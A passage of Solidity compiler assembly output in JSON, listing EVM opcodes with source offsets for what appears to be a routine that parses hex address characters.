										{
											"begin": 8262,
											"end": 8288,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8262,
											"end": 8288,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8262,
											"end": 8288,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8262,
											"end": 8288,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8262,
											"end": 8288,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8262,
											"end": 8288,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 8262,
											"end": 8288,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8262,
											"end": 8288,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 8262,
											"end": 8288,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8262,
											"end": 8288,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 8262,
											"end": 8288,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 8262,
											"end": 8288,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8262,
											"end": 8288,
											"name": "PUSH",
											"source": 0,
											"value": "3000000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 8262,
											"end": 8288,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8262,
											"end": 8288,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 8262,
											"end": 8288,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8275,
											"end": 8287,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 8262,
											"end": 8269,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "49"
										},
										{
											"begin": 8262,
											"end": 8288,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 8262,
											"end": 8288,
											"name": "tag",
											"source": 0,
											"value": "70"
										},
										{
											"begin": 8262,
											"end": 8288,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8233,
											"end": 8288,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8233,
											"end": 8288,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8320,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8301,
											"end": 8320,
											"name": "SWAP15",
											"source": 0
										},
										{
											"begin": 8301,
											"end": 8320,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8301,
											"end": 8320,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8301,
											"end": 8320,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8301,
											"end": 8320,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8301,
											"end": 8320,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8301,
											"end": 8320,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8301,
											"end": 8320,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8301,
											"end": 8320,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8301,
											"end": 8320,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8301,
											"end": 8320,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8301,
											"end": 8320,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8301,
											"end": 8320,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8301,
											"end": 8320,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8301,
											"end": 8320,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8301,
											"end": 8320,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7268,
											"end": 8328,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 7268,
											"end": 8328,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 4475,
											"end": 5415,
											"name": "tag",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 4475,
											"end": 5415,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4541,
											"end": 4556,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 4569,
											"end": 4585,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 4594,
											"end": 4596,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 4569,
											"end": 4597,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 4569,
											"end": 4597,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4608,
											"end": 4621,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 4636,
											"end": 4646,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 4657,
											"end": 4667,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 4683,
											"end": 4689,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 4692,
											"end": 4693,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 4683,
											"end": 4693,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 4683,
											"end": 4693,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4678,
											"end": 5376,
											"name": "tag",
											"source": 0,
											"value": "72"
										},
										{
											"begin": 4678,
											"end": 5376,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4699,
											"end": 4709,
											"name": "PUSH",
											"source": 0,
											"value": "2A"
										},
										{
											"begin": 4695,
											"end": 4696,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 4695,
											"end": 4709,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 4678,
											"end": 5376,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 4678,
											"end": 5376,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "73"
										},
										{
											"begin": 4678,
											"end": 5376,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 4743,
											"end": 4746,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 4734,
											"end": 4746,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 4734,
											"end": 4746,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "75"
										},
										{
											"begin": 4734,
											"end": 4746,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 4734,
											"end": 4746,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 4734,
											"end": 4746,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "76"
										},
										{
											"begin": 4734,
											"end": 4746,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 4734,
											"end": 4746,
											"name": "tag",
											"source": 0,
											"value": "75"
										},
										{
											"begin": 4734,
											"end": 4746,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4734,
											"end": 4746,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 4734,
											"end": 4746,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4780,
											"end": 4783,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 4784,
											"end": 4785,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 4780,
											"end": 4786,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 4780,
											"end": 4786,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 4780,
											"end": 4786,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 4780,
											"end": 4786,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 4780,
											"end": 4786,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "77"
										},
										{
											"begin": 4780,
											"end": 4786,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 4780,
											"end": 4786,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "78"
										},
										{
											"begin": 4780,
											"end": 4786,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "79"
										},
										{
											"begin": 4780,
											"end": 4786,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 4780,
											"end": 4786,
											"name": "tag",
											"source": 0,
											"value": "78"
										},
										{
											"begin": 4780,
											"end": 4786,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4780,
											"end": 4786,
											"name": "tag",
											"source": 0,
											"value": "77"
										},
										{
											"begin": 4780,
											"end": 4786,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4780,
											"end": 4786,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 4780,
											"end": 4786,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 4780,
											"end": 4786,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 4780,
											"end": 4786,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 4780,
											"end": 4786,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 4780,
											"end": 4786,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 4780,
											"end": 4786,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 4780,
											"end": 4786,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 4774,
											"end": 4787,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 4774,
											"end": 4787,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 4766,
											"end": 4788,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 4766,
											"end": 4788,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 4761,
											"end": 4788,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 4761,
											"end": 4788,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4822,
											"end": 4825,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 4830,
											"end": 4831,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 4826,
											"end": 4827,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 4826,
											"end": 4831,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 4826,
											"end": 4831,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 4826,
											"end": 4831,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 4826,
											"end": 4831,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "81"
										},
										{
											"begin": 4826,
											"end": 4831,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 4826,
											"end": 4831,
											"name": "tag",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 4826,
											"end": 4831,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4822,
											"end": 4832,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 4822,
											"end": 4832,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 4822,
											"end": 4832,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 4822,
											"end": 4832,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 4822,
											"end": 4832,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "82"
										},
										{
											"begin": 4822,
											"end": 4832,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 4822,
											"end": 4832,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "83"
										},
										{
											"begin": 4822,
											"end": 4832,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "79"
										},
										{
											"begin": 4822,
											"end": 4832,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 4822,
											"end": 4832,
											"name": "tag",
											"source": 0,
											"value": "83"
										},
										{
											"begin": 4822,
											"end": 4832,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4822,
											"end": 4832,
											"name": "tag",
											"source": 0,
											"value": "82"
										},
										{
											"begin": 4822,
											"end": 4832,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4822,
											"end": 4832,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 4822,
											"end": 4832,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 4822,
											"end": 4832,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 4822,
											"end": 4832,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 4822,
											"end": 4832,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 4822,
											"end": 4832,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 4822,
											"end": 4832,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 4822,
											"end": 4832,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 4816,
											"end": 4833,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 4816,
											"end": 4833,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 4808,
											"end": 4834,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 4808,
											"end": 4834,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 4803,
											"end": 4834,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 4803,
											"end": 4834,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4860,
											"end": 4862,
											"name": "PUSH",
											"source": 0,
											"value": "61"
										},
										{
											"begin": 4854,
											"end": 4856,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 4854,
											"end": 4862,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4854,
											"end": 4862,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 4854,
											"end": 4862,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 4854,
											"end": 4862,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 4853,
											"end": 4878,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 4853,
											"end": 4878,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 4853,
											"end": 4878,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "84"
										},
										{
											"begin": 4853,
											"end": 4878,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 4853,
											"end": 4878,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4874,
											"end": 4877,
											"name": "PUSH",
											"source": 0,
											"value": "66"
										},
										{
											"begin": 4868,
											"end": 4870,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 4868,
											"end": 4877,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4868,
											"end": 4877,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 4868,
											"end": 4877,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 4868,
											"end": 4877,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 4853,
											"end": 4878,
											"name": "tag",
											"source": 0,
											"value": "84"
										},
										{
											"begin": 4853,
											"end": 4878,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4849,
											"end": 5081,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 4849,
											"end": 5081,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "85"
										},
										{
											"begin": 4849,
											"end": 5081,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 4905,
											"end": 4907,
											"name": "PUSH",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 4899,
											"end": 4907,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 4899,
											"end": 4907,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "86"
										},
										{
											"begin": 4899,
											"end": 4907,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 4899,
											"end": 4907,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 4899,
											"end": 4907,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "87"
										},
										{
											"begin": 4899,
											"end": 4907,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 4899,
											"end": 4907,
											"name": "tag",
											"source": 0,
											"value": "86"
										},
										{
											"begin": 4899,
											"end": 4907,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4899,
											"end": 4907,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 4899,
											"end": 4907,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4849,
											"end": 5081,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "88"
										},
										{
											"begin": 4849,
											"end": 5081,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 4849,
											"end": 5081,
											"name": "tag",
											"source": 0,
											"value": "85"
										},
										{
											"begin": 4849,
											"end": 5081,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4940,
											"end": 4942,
											"name": "PUSH",
											"source": 0,
											"value": "41"
										},
										{
											"begin": 4934,
											"end": 4936,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 4934,
											"end": 4942,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4934,
											"end": 4942,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 4934,
											"end": 4942,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 4934,
											"end": 4942,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 4933,
											"end": 4957,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 4933,
											"end": 4957,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 4933,
											"end": 4957,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "89"
										},
										{
											"begin": 4933,
											"end": 4957,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 4933,
											"end": 4957,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4954,
											"end": 4956,
											"name": "PUSH",
											"source": 0,
											"value": "46"
										},
										{
											"begin": 4948,
											"end": 4950,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 4948,
											"end": 4956,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4948,
											"end": 4956,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 4948,
											"end": 4956,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 4948,
											"end": 4956,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 4933,
											"end": 4957,
											"name": "tag",
											"source": 0,
											"value": "89"
										},
										{
											"begin": 4933,
											"end": 4957,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4929,
											"end": 5081,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 4929,
											"end": 5081,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "90"
										},
										{
											"begin": 4929,
											"end": 5081,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 4984,
											"end": 4986,
											"name": "PUSH",
											"source": 0,
											"value": "37"
										},
										{
											"begin": 4978,
											"end": 4986,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 4978,
											"end": 4986,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "91"
										},
										{
											"begin": 4978,
											"end": 4986,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 4978,
											"end": 4986,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 4978,
											"end": 4986,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "87"
										},
										{
											"begin": 4978,
											"end": 4986,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 4978,
											"end": 4986,
											"name": "tag",
											"source": 0,
											"value": "91"
										},
										{
											"begin": 4978,
											"end": 4986,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4978,
											"end": 4986,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 4978,
											"end": 4986,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4929,
											"end": 5081,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "92"
										},
										{
											"begin": 4929,
											"end": 5081,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 4929,
											"end": 5081,
											"name": "tag",
											"source": 0,
											"value": "90"
										},
										{
											"begin": 4929,
											"end": 5081,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5019,
											"end": 5021,
											"name": "PUSH",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 5013,
											"end": 5015,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 5013,
											"end": 5021,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5013,
											"end": 5021,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 5013,
											"end": 5021,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 5013,
											"end": 5021,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 5012,
											"end": 5036,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5012,
											"end": 5036,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 5012,
											"end": 5036,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "93"
										},
										{
											"begin": 5012,
											"end": 5036,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 5012,
											"end": 5036,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5033,
											"end": 5035,
											"name": "PUSH",
											"source": 0,
											"value": "39"
										},
										{
											"begin": 5027,
											"end": 5029,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 5027,
											"end": 5035,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5027,
											"end": 5035,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 5027,
											"end": 5035,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 5027,
											"end": 5035,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 5012,
											"end": 5036,
											"name": "tag",
											"source": 0,
											"value": "93"
										},
										{
											"begin": 5012,
											"end": 5036,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5008,
											"end": 5081,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 5008,
											"end": 5081,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "94"
										},
										{
											"begin": 5008,
											"end": 5081,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 5063,
											"end": 5065,
											"name": "PUSH",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 5057,
											"end": 5065,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 5057,
											"end": 5065,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "95"
										},
										{
											"begin": 5057,
											"end": 5065,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5057,
											"end": 5065,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5057,
											"end": 5065,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "87"
										},
										{
											"begin": 5057,
											"end": 5065,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5057,
											"end": 5065,
											"name": "tag",
											"source": 0,
											"value": "95"
										},
										{
											"begin": 5057,
											"end": 5065,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5057,
											"end": 5065,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 5057,
											"end": 5065,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5008,
											"end": 5081,
											"name": "tag",
											"source": 0,
											"value": "94"
										},
										{
											"begin": 5008,
											"end": 5081,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4929,
											"end": 5081,
											"name": "tag",
											"source": 0,
											"value": "92"
										},
										{
											"begin": 4929,
											"end": 5081,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4849,
											"end": 5081,
											"name": "tag",
											"source": 0,
											"value": "88"
										},
										{
											"begin": 4849,
											"end": 5081,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5108,
											"name": "PUSH",
											"source": 0,
											"value": "61"
										},
										{
											"begin": 5100,
											"end": 5102,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 5100,
											"end": 5108,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5100,
											"end": 5108,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 5100,
											"end": 5108,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 5100,
											"end": 5108,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 5099,
											"end": 5124,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5099,
											"end": 5124,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 5099,
											"end": 5124,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "96"
										},
										{
											"begin": 5099,
											"end": 5124,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 5099,
											"end": 5124,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5120,
											"end": 5123,
											"name": "PUSH",
											"source": 0,
											"value": "66"
										},
										{
											"begin": 5114,
											"end": 5116,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 5114,
											"end": 5123,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5114,
											"end": 5123,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 5114,
											"end": 5123,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 5114,
											"end": 5123,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 5099,
											"end": 5124,
											"name": "tag",
											"source": 0,
											"value": "96"
										},
										{
											"begin": 5099,
											"end": 5124,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5095,
											"end": 5327,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 5095,
											"end": 5327,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "97"
										},
										{
											"begin": 5095,
											"end": 5327,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 5151,
											"end": 5153,
											"name": "PUSH",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 5145,
											"end": 5153,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 5145,
											"end": 5153,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "98"
										},
										{
											"begin": 5145,
											"end": 5153,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5145,
											"end": 5153,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5145,
											"end": 5153,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "87"
										},
										{
											"begin": 5145,
											"end": 5153,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5145,
											"end": 5153,
											"name": "tag",
											"source": 0,
											"value": "98"
										},
										{
											"begin": 5145,
											"end": 5153,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5145,
											"end": 5153,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5145,
											"end": 5153,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5095,
											"end": 5327,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "99"
										},
										{
											"begin": 5095,
											"end": 5327,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5095,
											"end": 5327,
											"name": "tag",
											"source": 0,
											"value": "97"
										},
										{
											"begin": 5095,
											"end": 5327,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5186,
											"end": 5188,
											"name": "PUSH",
											"source": 0,
											"value": "41"
										},
										{
											"begin": 5180,
											"end": 5182,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 5180,
											"end": 5188,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5180,
											"end": 5188,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 5180,
											"end": 5188,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 5180,
											"end": 5188,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 5179,
											"end": 5203,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5179,
											"end": 5203,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 5179,
											"end": 5203,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 5179,
											"end": 5203,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 5179,
											"end": 5203,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5200,
											"end": 5202,
											"name": "PUSH",
											"source": 0,
											"value": "46"
										},
										{
											"begin": 5194,
											"end": 5196,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 5194,
											"end": 5202,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5194,
											"end": 5202,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 5194,
											"end": 5202,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 5194,
											"end": 5202,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 5179,
											"end": 5203,
											"name": "tag",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 5179,
											"end": 5203,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5175,
											"end": 5327,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 5175,
											"end": 5327,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "101"
										},
										{
